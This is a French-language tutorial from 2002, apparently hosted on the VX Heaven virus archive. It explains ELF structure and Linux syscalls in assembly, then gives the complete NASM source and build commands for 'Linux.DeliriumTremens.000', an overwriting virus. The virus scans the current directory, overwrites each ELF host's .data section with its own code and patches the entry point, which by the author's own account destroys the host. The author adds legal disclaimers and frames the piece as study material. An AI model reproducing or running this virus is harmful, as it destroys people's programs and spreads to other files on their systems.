<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Emper0r 'ELF infection la menace fantome: Épisode 1' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Emper0r"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Emper0r,ELF infection la menace fantome: Épisode 1, header, laptop, entry, call, size, deliriumtremens, section, emper, chaîne, file, shoff, progbits, offset, virus, table"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"3ebc7670ec32486408c5e382240cfd7cbfa93737-1498757923-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vem00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>ELF infection la menace fantome: Épisode 1</h1><p><a href="/lib/?lang=fr&amp;author=Emper0r"> Emper0r</a><br/> <em> 2002</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vem00.html';</script>[<a style="" href="/lib/?lang=FR&amp;index=UN#vem00">Back to index</a>] [<a href="/lib/vem00.html#disqus_thread">Comments</a>]<br/> 
<h2>Sommaire</h2>
<ol type="I">
<li><a href="#p1">Introduction</a></li>
<li><a href="#p2">Langage assembleur sous linux</a>
<ol type="A">
<li><a href="#p2a">Compilateur et syntaxe</a></li>
<li><a href="#p2b">Le format elf</a></li>
<li><a href="#p2c">Syscall</a></li>
</ol>
</li>
<li><a href="#p3">Plan d'attaque</a></li>
<li><a href="#p4">Le code</a></li>
<li><a href="#p5">Conclusion</a></li>
</ol>
<h2><a name="p1">I. Introduction</a></h2>
<p>Avant de commencer petit rappel: <q>Entraver ou fausser le fonctionnement d'un système de traitement automatisé de données est passible d'un emprisonnement de 3 mois à 3 ans et d'une amende de 10 000 F à 100 000 F</q> (cf. iocmag issue4). </p>
<p>Attention a ce que vous faites ; en aucun cas vous ne pouvez vous servir des informations de cet article pour nuire au le fonctionnement d'un système.</p>
<p>Ca y est je viens de finir mon premier lame elf infector :) Je vous préviens tout de suite, mon virus est malheureusement un simple virus a recouvrement, pas un parasite ! La principale difficulté que j'ai rencontré fut l'extrême rigidité du format elf:</p>
<ul>
<li>On ne peut pas modifier les droits des sections.</li>
<li>Il y a peu voir pas du tout d'espace non utilisé.</li>
<li>Rigidité extrême, tout ce qui est incorrect segfault, même si ca pourrait théoriquement fonctionner.</li>
<li>Certaines section sont recouverte au lancement.</li>
<li>Agrandir les sections pause pas mal de problème, c'est long et compliqué (mais c'est certainement la solution)</li>
<li>Je n'ai même pas réussi a ajouter une nouvelle section correctement exploitable.</li>
</ul>
<p>Bref tout le contraire du très souple format PE. Cet article peu être suivi par tout le monde, il ne s'adresse pas uniquement aux vxers.</p>
<h2><a name="p2">II. Langage assembleur sous linux.</a></h2>
<h3><a name="p2a">A. Compilateur et syntaxe</a></h3>
<p>Je ne vais pas reprendre les bases de l'asm, les fonctionnement des registres et des instructions de bases étant expliqués dans IOC#3 et IOC#4.</p>
<p>Sous linux on a le choix entre plusieurs assembleur dont certains utilisent des syntaxe différentes. Les plus utilisé sont:</p>
<ul>
<li> NASM: Qui utilise la syntaxe intel, utilisé sous windows/dos</li>
<li> GAS: Qui utilise une syntaxe AT&amp;T</li>
</ul>
<p>[ Différences de la syntaxe AT&amp;T ]</p>
<ul>
<li>Les noms de registres sont préfixés avec %, de façon que les registres sont %eax, %dl et consorts au lieu de juste eax, dl, etc. Ceci rend possible l'inclusion directe de noms de symboles externes C sans risque de confusion, ou de nécessité de préfixes.</li>
<li>L'ordre des opérandes est source(s) d'abord, destination en dernier, à l'opposé de la convention d'intel consistant à mettre la destination en premier, les source(s) ensuite. Ainsi, ce qui en syntaxe intel s'écrit "mov ax,dx" (affecter au registre ax le contenu du registre dx) s'écrira en syntaxe AT&amp;T "mov %dx, %ax".</li>
<li>La longueur des opérandes est spécifiée comme suffixe du nom d'instruction. Le suffixe est b pour un octet (8 bit), 'w' pour un mot (16 bit), et 'l' pour un mot long (32 bit). Par exemple, la syntaxe correcte pour l'instruction ci-dessus aurait dû être "movw %dx,%ax". Toutefois, gas n'est pas trop aussi strict que la syntaxe AT&amp;T, et le suffixe est optionnel quand la longueur peut être devinée grâce aux opérandes qui sont des registres, la taille par défaut étant 32 bit (avec une mise en garde quand on y fait appel).</li>
<li>Les opérandes immédiates sont marqués d'un préfixe '$', comme dans 'addl $5,%eax' (ajouter la valeur longue immédiate 5 au registre %eax).</li>
<li>L'absence de préfixe à une opérande indique une adresse mémoire ; ainsi 'movl $foo,%eax' met l'adresse de la variable foo dans le registre %eax, tandis que 'movl foo,%eax' met le contenu de la variable foo dans le registre %eax.</li>
<li>L'indexation ou l'indirection se fait en mettant entre parenthèses le registre d'index ou la case mémoire contenant l'indirection, comme dans "testb $0x80,17(%ebp)" (tester le bit de poids fort de l'octet au déplacement 17 après la case pointée par %ebp).</li>
</ul>
<p>Exemple:</p>
<table border="1" summary="Example of AT&amp;T and Intel syntax">
<tr><th>Syntaxe Intel</th><th>Syntaxe AT&amp;T</th></tr>
<tr><td><pre>
push ebp
mov ebp,esp
</pre></td><td><pre>
pushl %ebp
movl %esp,%ebp
</pre></td></tr></table>
<p>Personnellement j'utilise la syntaxe intel aussi sous linux, étant habitué a celle-ci. Je ne voit pas d'avantage à utiliser AT&amp;T qui est plus longue à taper. Cependant vous devez la comprendre car gdb donne du code désassemblé en syntaxe AT&amp;T.</p>
<p>Vous trouverez prochainement (quand j'aurais le temps) sur mon site, un script perl pour convertir des sources d'une syntaxe vers une autre. (www.arbornet.org/~emper0r)</p>
<h3><a name="p2b">B. Le format elf</a></h3>
<p>Juste quelques bases pour ceux qui connaissent rien au format elf.</p>
<h4>Les sections</h4>
<p>3 sections nous intéresse particulièrement:</p>
<ul>
<li>.data : elle contient des constantes, par exemple une chaîne de caractère</li>
<li>.bss : c'est la que l'on déclare nos variables ex: filename resb 255; Reserve 255 octets</li>
<li>.text : c'est ici que ce trouve votre code.</li>
</ul>
<p>Essayez la commande 'readelf' elle donne énormément de renseignements sur l'elf que vous voulez. Je suis en train de coder un petit outil du style de "readelf" avec quelques options en plus, bientôt dispo sur mon site (www.arbornet.org/~emper0r)</p>
<p><em>Note de Neofox : c'est bon Emp', on a l'adresse =</em></p>
<p>Que peut on trouver d'interréssant dans le elf header:</p>
<pre class="source">
typedef struct
{
  unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */
  Elf32_Half e_type;                /* Object file type */
  Elf32_Half e_machine;             /* Architecture */
  Elf32_Word e_version;             /* Object file version */
  Elf32_Addr e_entry;               /* Entry point virtual address */
  Elf32_Off  e_phoff;               /* Program header table file offset */
  Elf32_Off  e_shoff;               /* Section header table file offset */
  Elf32_Word e_flags;               /* Processor-specific flags */
  Elf32_Half e_ehsize;              /* ELF header size in bytes */
  Elf32_Half e_phentsize;           /* Program header table entry size */
  Elf32_Half e_phnum;               /* Program header table entry count */
  Elf32_Half e_shentsize;           /* Section header table entry size */
  Elf32_Half e_shnum;               /* Section header table entry count */
  Elf32_Half e_shstrndx;            /* Section header string table index */
} Elf32_Ehdr;
</pre>
<p>Ce qui nous interresse:</p>
<ul>
<li>e_entry: Variable contenant le virtual offset du premier octet du code.</li>
<li>e_shoff: Variable contenant l'offset ou ce trouve le section header.</li>
</ul>
<h4>La section header</h4>
<pre class="source">
/* Section header.  */

typedef struct
{
  Elf32_Word    sh_name;                /* Section name (string tbl index) */
  Elf32_Word    sh_type;                /* Section type */
  Elf32_Word    sh_flags;               /* Section flags */
  Elf32_Addr    sh_addr;                /* Section virtual addr at execution */
  Elf32_Off     sh_offset;              /* Section file offset */
  Elf32_Word    sh_size;                /* Section size in bytes */
  Elf32_Word    sh_link;                /* Link to another section */
  Elf32_Word    sh_info;                /* Additional section information */
  Elf32_Word    sh_addralign;           /* Section alignment */
  Elf32_Word    sh_entsize;             /* Entry size if section holds table */
} Elf32_Shdr;
</pre>
<ul>
<li>sh_offset : Variable contenant l'offset de la section voulu</li>
</ul>
<p>Voila pour mon virus, on juste besoin de ces 3 variables.</p>
<h3><a name="p2c">C. Syscall</a></h3>
<p>Les syscalls sont des interruptions logicielles un peu comme les interruptions logicielles du DOS. Par conséquent ceux qui on déjà programmé sous DOS ne seront même pas dépaysés :)</p>
<p>Exemple: le bon vieux hello world</p>
<p>Pour écrire une ligne on va ce servir de sys_write. Voici ce que dit ma doc a propos de sys_write:</p>
<pre class="source">
arguments:
eax 4
ebx file descriptor
ecx ptr to output buffer
edx count of bytes to send

return:
eax no. of sent bytes (if POSIX conforming f.s.)
errors:
eax EAGAIN, EBADF, EFAULT, EINTR, EINVAL, EIO, ENOSPC, EPIPE
source
fs/read_write.c
</pre>
<p>Pour plus d'information: "man 2 write"</p>
<p>Si je veux écrire une ligne dans ma console :</p>
<pre class="source">
mov eax, 4              ;fonction écriture
mov ebx, 1              ;on écrit dans la console
mov ecx, msg            ;pointe vers la chaîne
mov edx, len            ;variable contenant la longueur de la chaîne
</pre>
<p>Le code complet:</p>
<pre class="source">
;----------------------------------------------------------------
section .data           		;section déclaration

msg     db      "Hello, world!",0xa	;Chaîne a afficher
len     equ     $ - msg                 ;longueur de cette chaîne


global main

section .text           		;section contenant le code

main:


        mov     edx, len        ;edx = longueur de la chaîne a afficher
        mov     ecx, msg        ;ecx pointe sur le début de la chaîne
        mov     ebx, 1          ;file handle, ou l'on écrit
        mov     eax, 4          ;sys_write
        int     0x80            ;call kernell

        mov     ebx, 0          ;ebx = 0 -&gt; exit code
        mov     eax, 1          ;sys_exit
        int     0x80
;----------------------------------------------------------------	

[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8beee6fbeef9bbf9cbe7eafbffe4fb">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> asm]$ nasm -f elf hello.asm
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c9aca4b9acbbf9bb89a5a8b9bda6b9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> asm]$ cc hello.o -o hello
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e1848c918493d193a18d8091958e91">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> asm]$ ./hello
Hello, world!
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="741119041106440634181504001b04">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> asm]$
</pre>
<p>Petite astuce avec: <code>len equ $ - msg</code>, le compilo remplit directement la longueur de la chaîne, sinon on peut metre la valeur directe biensur.</p>
<h2><a name="p3">III. Plan d'attaque</a></h2>
<p>Pour attaquer on a besoin :</p>
<ul>
<li>D'un éditeur texte, vi est trés bien.</li>
<li>Une table explicative des syscalls.</li>
<li>Une doc sur le format elf.</li>
<li>gdb.</li>
<li>Un éditeur hexa au choix.</li>
<li>nasm.</li>
<li>ldasm peut servir aussi en modifiant son code.</li>
</ul>
<p>J'ai tout d'abord cherché à faire un virus parasite, mais après plusieurs segfaults n'ayant toujours pas trouvé, je décide de faire mes débuts avec un virus a écrasement, le plus simple possible.</p>
<p>Tout d'abord je décide d'écraser la section .text, premier problème je ne peux pas utiliser de buffer, on ne peut pas écrire dans la section .text. Le problème du buffer est résolu, je vais tout mettre dans la pile, c'est pas trés propre mais je voit pas d'autre solution.</p>
<p>Second problème la section .text ne commence pas directement par notre main() du code est écrit avant ; si l'on écrase ce code, une partie sera récrite lors du chargement du elf :(</p>
<p>Il faudrait donc rechercher le début du main pour commencer à écrire notre virus. ( je sais pas si sa marche j'ai pas testé ). Cependant mon objectif est de faire le plus simple possible... Je cherche ailleurs...</p>
<p>12 segfaults et 4 bières plus tard je m'appercoit de quelques chose d'interréssant la section .data est exécutable ! (vous remarquez au passage ma moyenne de 3 segfaults/bière) Voila mon virus à écrasement va écraser cette section en partant du début.</p>
<p>Pour infos, beaucoup (toutes ?) de sections qui on les mêmes droits et fonctionnement que .data sont aussi exécutable.</p>
<p>Un avantage quand même sous linux pour les vxers, ce sont les syscalls pas besoin de créer une routine pour trouver les fonctions en mémoire. Le scann des apis en mémoire sous windows c'est franchement énervant.</p>
<h4>Explication de certainnes fonctions</h4>
<p>La programmation d'un virus contient toujours 2 parties très importante: la recherche de fichier hote et la copie du virus lui même.</p>
<p>Commençons par la recherche de fichier :</p>
<p>La recherche va se faire avec le syscall 220 -&gt; getdents64. Voici un petit exemple du contenu d'un buffer construit par getdents:</p>
<pre class="source">
0x80495ac &lt;direntsbuf&gt;:         0x00000000
0x80495b0 &lt;direntsbuf+4&gt;:       0x00000000
0x80495b4 &lt;direntsbuf+8&gt;:       0x0000000c
0x80495b8 &lt;direntsbuf+12&gt;:      0x00000000
0x80495bc &lt;direntsbuf+16&gt;:      0x2e040018  en + 19 le premier nom soit
0x80495c0 &lt;direntsbuf+20&gt;:      0x00000000
0x80495c4 &lt;direntsbuf+24&gt;:      0x00056a15       il y a 0x18 octets
0x80495c8 &lt;direntsbuf+28&gt;:      0x00000000       entre les noms cette info ce
0x80495cc &lt;direntsbuf+32&gt;:      0x00000018       trouve en + 16
0x80495d0 &lt;direntsbuf+36&gt;:      0x00000000
0x80495d4 &lt;direntsbuf+40&gt;:      0x2e040018  a partir de + 43 le deuxième nom
0x80495d8 &lt;direntsbuf+44&gt;:      0x0000002e
...   ...   ...   ...   ...   ...   ...
...   ...   ...   ...   ...   ...   ...
0x8049656 &lt;direntsbuf+170&gt;:     0x00000000
0x804965a &lt;direntsbuf+174&gt;:     0x00200000  prochain nom en $+20+3
0x804965e &lt;direntsbuf+178&gt;:     0x64646408  nom de fichier dddddddd
0x8049662 &lt;direntsbuf+182&gt;:     0x64646464
0x8049666 &lt;direntsbuf+186&gt;:     0x00000064
0x804966a &lt;direntsbuf+190&gt;:     0x27340000
0x804966e &lt;direntsbuf+194&gt;:     0x00000006
0x8049672 &lt;direntsbuf+198&gt;:     0x00740000
0x8049676 &lt;direntsbuf+202&gt;:     0x00000000
0x804967a &lt;direntsbuf+206&gt;:     0x00200000  prochain nom en $+20+3
0x804967e &lt;direntsbuf+210&gt;:     0x65656508  nom de fichier eeeeeeeeee
0x8049682 &lt;direntsbuf+214&gt;:     0x65656565
0x8049686 &lt;direntsbuf+218&gt;:     0x00656565
0x804968a &lt;direntsbuf+222&gt;:     0x27350000
etc ....
</pre>
<p>En analysant ce buffer, on peut voir que le premier nom de fichier se trouve en 0x13 "direntsbuf+19". On voit aussi que 3 octet avant, en 0x10 "direntsbuf+16" ce trouve l'offset du prochain du prochain nom + 3. Et ainsi de suite.</p>
<p>La Deuxième fonction est donc l'infection, en théorie ca donne:</p>
<ol>
<li>Récupération un nom de fichier</li>
<li>Ouverture de ce fichiers
<ul>
<li>sion peut pas on passe en 1</li>
</ul></li>
<li>Test si il s'agit bien d'un elf
<ul>
<li>si ce n'est pas le cas on revient en 1</li>
</ul></li>
<li>Test si la taille de .data du fichier trouvé est &gt; a la taille de notre virus
<ul>
<li>sinon on passe en 1</li>
</ul></li>
<li>Écriture de notre virus au début de .data</li>
<li>Modification de l'EP du fichier vers le début de la section .data</li>
<li>Tous les fichiers de ce rep ont était testé?
<ul>
<li>sinon on passe en 1</li>
</ul></li>
<li>Affichage de la signature et fin.</li>
</ol>
<h2><a name="p4">IV. Le code</a></h2>
<pre>
/!\  Si vous voulez le tester alors seulement sur votre propre 
     bécane. Attention ce code est destructeur.

/!\  La destruction et/ou modification de données ainsi que la
     propagation de virus est trés fortement punis par la loi.
</pre>
<p>Ce code permet l'étude de l'infection possible du format elf, en aucun cas il doit être utiliser dans le but de nuire ou détruire.</p>
<pre class="source">
;----------------------------------------------------
;
;                Linux.DeliriumTremens.000 by Emper0r
;                ____________________________________
;
;
;
;Just a another lame virus ...
;
;
;Le Delirium Tremens est une 'maladie' lié à la suspension brutale de
;l'intoxication a l'alcool, des symptômes mineurs initiaux peuvent apparaître
;6 à 8 heures après la dernière absorption. Cette 'maladie' provoque
;agitation, état confusionnel, hallucinations, tremblement rapide,
;trouble du sommeil, signes neuro-végétatifs (sudation, fièvre, tachycardie ..)
;
;
;La Delirium Tremens est aussi une bière trés bonne (oupss j'ai fait d'la pub )
;
;
;Linux.DeliriumTremens.000 est un petit virus capable d'infecter tout les elfs
;du répertoire courant du moment que ceux ci on une section .data plus
;importante que son code.
;
;Linux.DeliriumTremens.000 est un virus a écrasement il est DESTRUCTEUR, la
;section .data ou du moins une parti est écrasée et l'hote ne fonctionne plus
;du tout, il est irrémédiablement détruit.
;
;Si vous voulez le tester alors faite le seulement sur votre propre bécane en
;connaissant les risques encouru...
;
;Remerciement:
;	- A tous ceux qui participent et/ou soutiennent la IOC.
;	- La team 29A et tout particulièrement SnakeByte et Mandragore
;	- Tous les vxers bien taré et bien sympa que l'on retrouve dans certains
;         coin obscur de l'IRC :)
;
;
;Pour compiler ca :
;nasm -f elf DeliriumTremens.asm
;cc DeliriumTremens.o -o DeliriumTremens
;(compiler sous linux avec un kernell 2.4.18)
;
;"He who makes a beast of himself gets arid of the pain of being a man"
;
;


section .data           ;Le code de la souche est aussi dans la .data

main :
debutvirus:	        ;


mov eax, 5              ;ouverture
push 0x2E               ;0x2E= '.' astuce pour pas utiliser de buffer
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80

sub esp, 0x10000        ;recup de la place sur la pile, 64ko
                        ;juste pour les noms
mov ebx, eax
mov eax, 220            ;getdents
mov ecx, esp            ;buffer_résultat dans esp
mov edx, 0x10000        ;taille
int 0x80

mov ebp, 16             ;premier nom en ebp + 3



lol:
mov ebx, ebp
add ebx, 3              ;esp + 3 = première lettre du nom
jmp fouverture          ;j'aurai du le remplacer par un call mais j'ai
                        ;déja assez de manip sur la pile(voir la suite)


arf:
mov ecx, ebp            ;test si plus de fichier dans le buf
mov dl, byte [esp + ecx]
cmp dl, 0
je bye                  ;plus de fichier alors casse toi
add ecx, edx            ;sinon ajoute le prochain décalage
mov ebp, ecx            ;on le sauve
jmp lol                 ;et on passe au suivant



fermeture:
mov eax, 6              ;on ferme le fichier ouvert
int 0x80                ;
jmp arf                 ;on va ce préparé a repartir avec un nouveau fichier



bye:
mov eax, 4              ;affiche la signature
mov ebx, 1

call @@@                ;permet de récupéré eip
@@@:                    ;dans ecx, une fois infecter les
pop ecx                 ;labels ne fonctionneront plus

add ecx, 0xDD           ;notre signature ce trouve 0xDD plus loin
mov edx, 38             ;longueur de la signature
int 0x80

mov eax, 1              ;c'est fini on stoppe tout
mov ebx, 0
int 0x80



fouverture:             ;ouverture du fichier
mov eax, 5
add ebx, esp
mov ecx, 2
xor edx, edx
int 0x80


cmp ah, 0xFF            ;teste si on a pu l'ouvrir
je arf                  ;sinon on va ce préparé pour un nouveau fichier

push eax                ;met le file descriptor sur la pile
pop ebx                 ;recup le FD

call sysread            ;lecture des 4 premiers octet du fichier

cmp eax, 0x464C457F     ;test si elf
jne fermeture           ;sinon on ce casse

mov ecx, 0x20
call syslseek           ;lseek sur e_shoff (section header offset)
call sysread            ;lecture de e_shoff
push eax                ;sauvegarde de e_shoff

mov ecx, eax

add ecx, 0x26C          ;on ce place sur sh_size .data
call syslseek           ;"
call sysread            ;on lit sh_size (section header size)
pop ecx                 ;on récupère e_shoff ici, sinon pb de déséquilibre pile
cmp eax, finvirus - debutvirus  ;si pas la place de mettre le code viral dans
jl fermeture            ;.data alors on ce casse

add ecx, 0x268          ;on ce place sur sh_offset de .data
call syslseek           ;"
call sysread            ;on lit sh_offset .data

mov ecx, eax
push ecx                ;sauve sh_offset .data

call syslseek           ;on ce place au début de .data pour écrire

mov eax, 4              ;écriture :)
call cocaïne            ;Toujours pareil on recup eip dans ecx
cocaïne:                ;car les labels seront 'détruits' dans les
pop ecx                 ;fichiers infecter
sub ecx, 0xEB           ;début du code viral en eip - 0xEB
mov edx, finvirus - debutvirus    ;nb d'octet a écrire, pas de pbs de label ici
int 0x80

mov ecx, 0x18           ;adresse de e_entry (Entry point)
call syslseek           ;lseek sur e_entry

écriture:
mov eax, 4
pop ecx                 ;ecx = sh_offset .data
add ecx, 0x8049000      ;ajout du virtual offset
push ecx
mov ecx, esp            ;petite astuce
pop edx                 ;rééquilibre la pile avec un octet
mov edx, 4
int 0x80

jmp fermeture



sysread:                ;FD dans ebx, les 4 octet lu sont récupéré dans eax
mov eax, 3              ;sys_call read
sub esp, 4              ;on ce pend 4 octet sur la pile
mov ecx, esp            ;buffer sur la pile
mov edx, 4
int 0x80
pop eax                 ;résultat dans eax
ret



syslseek:       ;il faut le fd dans ebx, et le déplacement dans ecx
                ;déplacement a partir du début du fichier
mov eax, 19
xor edx, edx
int 0x80
ret



signature db 'Linux.DeliriumTremens.000 By Emper0r',10,13,
finvirus:
;----------------------------------------------------
</pre>
<h4>Les tests</h4>
<p>Combien fait le code de mon virus pour commencer:</p>
<pre>
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="12777f6277602260527e7362667d62">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> vx]$  readelf -S DeliriumTremens |grep .data
  [14] .rodata           PROGBITS        08048430 000430 000008 00   A  0   0  4
  [15] .data             PROGBITS        08049438 000438 000178 00  WA  0   0  4
</pre>
<p>Mon virus dans la .data fait donc 0x178 (en vérité un peu moins)</p>
<p>On va récupéré plusieurs elf avec différentes tailles de section .data. Un petit script shell que j'appelle sondage.sh va me faire ca:</p>
<pre class="source">
#!/bin/bash
echo "sondage de la taille de la section $1 dans le rep /bin/\n" > resultat
for file in /bin/*
do
        echo $file &gt;&gt; resultat
        readelf -S $file | grep $1 &gt;&gt; resultat
        echo "" &gt;&gt; resultat
done
cat resultat

[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="77121a0712054705371b1607031807">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> vx]$ ./sondage.sh .data

......
</pre>
<p>Il y a beaucoup de résultat je vais juste prendre ces 3 fichiers ca me va très bien:</p>
<pre>
/bin/ypdomainname
  [14] .rodata           PROGBITS        08049500 001500 000aa1 00   A  0   0 32
  [15] .data             PROGBITS        0804afa4 001fa4 000018 00  WA  0   0  4
                                                             --
/bin/zcat
  [14] .rodata           PROGBITS        08051da0 009da0 001771 00   A  0   0 32
  [15] .data             PROGBITS        08054520 00b520 000ac0 00  WA  0   0 32
                                                            ---
/bin/zsh
  [14] .rodata           PROGBITS        080ab680 063680 005eed 00   A  0   0 32
  [15] .data             PROGBITS        080b2580 069580 002f70 00  WA  0   0 32
                                                           ----

[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2d48405d485f1d5f6d414c5d59425d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> vx]$ ls
compilo.sh*       DeliriumTremens.asm   resultat     ypdomainname*  zsh*
